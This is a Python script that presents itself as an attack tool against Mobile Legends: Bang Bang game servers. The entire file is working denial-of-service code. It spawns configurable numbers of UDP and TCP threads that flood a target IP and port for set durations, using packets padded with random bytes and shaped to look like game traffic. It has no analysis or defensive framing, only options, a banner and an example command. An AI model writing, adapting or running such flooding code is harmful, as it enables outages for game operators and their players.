import argparse
import os
import random
import socket
import sys
import threading
import time
from contextlib import suppress


def create_udp_socket() -> socket.socket:
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            udp_sock.bind(('', random.randint(32768, 65535)))
            break
        except OSError:
            continue
    return udp_sock


def create_tcp_socket(target_ip: str, target_port: int) -> socket.socket:
    tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    tcp_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    tcp_sock.settimeout(.9)
    while True:
        try:
            tcp_sock.bind(('', random.randint(32768, 65535)))
            break
        except OSError:
            continue
    tcp_sock.connect((target_ip, target_port))
    return tcp_sock


def run_udp_flood(target_ip: str, target_port: int):
    udp_sock = create_udp_socket()
    START_EVENT.wait()
    while not UDP_EVENT.is_set():
        data = (b"\x01\x71" + os.urandom(12) + b"\x2e\x61\x62\x6f\x6d\x20\x54\x53\x45\x62\x20\x45\x48\x74\x2e"
                                               b"\x53\x44\x4e\x45\x47\x45\x6c\x20\x45\x4c\x49\x42\x4f\x6d\x01")
        udp_sock.sendto(data, (target_ip, target_port))


def run_tcp_flood(target_ip: str, target_port: int):
    START_EVENT.wait()
    while not TCP_EVENT.is_set():
        with suppress(Exception), create_tcp_socket(target_ip, target_port) as tcp_sock:
            while not TCP_EVENT.is_set():
                data = (b"\x00\x00\x00\x17\x70\x00\xf5\x07\x01" + os.urandom(2) +
                        b"\x45\x07\x70\x00" + os.urandom(4) + b"\x80\x06\x01\x80")
                if not tcp_sock.send(data):
                    break


def end_task(duration: int, event: threading.Event):
    time.sleep(duration)
    event.set()


def start_threads(target_function, target: str, thread_count: int, event: threading.Event, duration: int):
    target_ip = target.split(":")[0]
    target_port = int(target.split(":")[1])
    for _ in range(thread_count):
        threading.Thread(target=target_function, args=(target_ip, target_port), daemon=True).start()
    threading.Thread(target=end_task, args=(duration, event)).start()


def print_banner():
    colors = [
        "\033[31m",
        "\033[38;5;196m",
        "\033[38;5;88m",
        "\033[38;5;52m",
        "\033[38;5;124m",

        "\033[38;5;208m",
        "\033[38;5;202m",
        "\033[38;5;214m",
        "\033[38;5;166m",
        "\033[38;5;130m",

        "\033[33m",
        "\033[38;5;226m",
        "\033[38;5;220m",
        "\033[38;5;190m",
        "\033[38;5;142m",

        "\033[38;5;214m",
        "\033[38;5;220m",
        "\033[38;5;215m",
        "\033[38;5;220m"
    ]

    banner = (
        "┳┳┓  ┓ •┓    ┓          ┓    ┏┓        ┳┓      ╻\n"
        "┃┃┃┏┓┣┓┓┃┏┓  ┃ ┏┓┏┓┏┓┏┓┏┫┏•  ┃┓┏┓┏┓┏┓  ┣┫┏┓┏┓┏┓┃\n"
        "┛ ┗┗┛┗┛┗┗┗   ┗┛┗ ┗┫┗ ┛┗┗┻┛•  ┗┛┗┻┛┗┗┫  ┻┛┗┻┛┗┗┫•\n"
        "                  ┛                 ┛         ┛"
    )
    colored_banner = ""

    for char in banner:
        colored_banner += f"{random.choice(colors)}{char}\033[0m"

    print(colored_banner)


def main():
    script_name = os.path.basename(sys.argv[0])
    parser = argparse.ArgumentParser(
        description="Attack script for Mobile Legends: Bang Bang game servers.",
        usage=f"python3 {script_name} --target <ip:port> --udp_thread_count <count> --tcp_thread_count <count> "
              f"--udp_duration <duration> --tcp_duration <duration>\n"
              f"help: python3 {script_name} --help",
        epilog=f"Example: python3 {script_name} -t 127.0.0.1:5000 -utc 100 -ttc 100 -ud 3600 -td 3600"
    )

    parser.add_argument(
        "-t", "--target",
        help="IP:port of the target server",
        type=str,
        required=True
    )
    parser.add_argument(
        "-utc", "--udp_thread_count",
        help="Number of UDP attack threads (default: 25)",
        nargs="?",
        default=25,
        type=int
    )
    parser.add_argument(
        "-ttc", "--tcp_thread_count",
        help="Number of TCP attack threads (default: 25)",
        nargs="?",
        default=25,
        type=int
    )
    parser.add_argument(
        "-ud", "--udp_duration",
        help="UDP attack duration in seconds (default: 300)",
        nargs="?",
        default=300,
        type=int
    )
    parser.add_argument(
        "-td", "--tcp_duration",
        help="TCP attack duration in seconds (default: 300)",
        nargs="?",
        default=300,
        type=int
    )

    args = parser.parse_args()

    start_threads(target_function=run_udp_flood,
                  target=args.target,
                  thread_count=args.udp_thread_count,
                  event=UDP_EVENT,
                  duration=args.udp_duration)
    start_threads(target_function=run_tcp_flood,
                  target=args.target,
                  thread_count=args.tcp_thread_count,
                  event=TCP_EVENT,
                  duration=args.tcp_duration)

    START_EVENT.set()

    print_banner()


if __name__ == '__main__':
    UDP_EVENT = threading.Event()
    TCP_EVENT = threading.Event()
    START_EVENT = threading.Event()
    main()
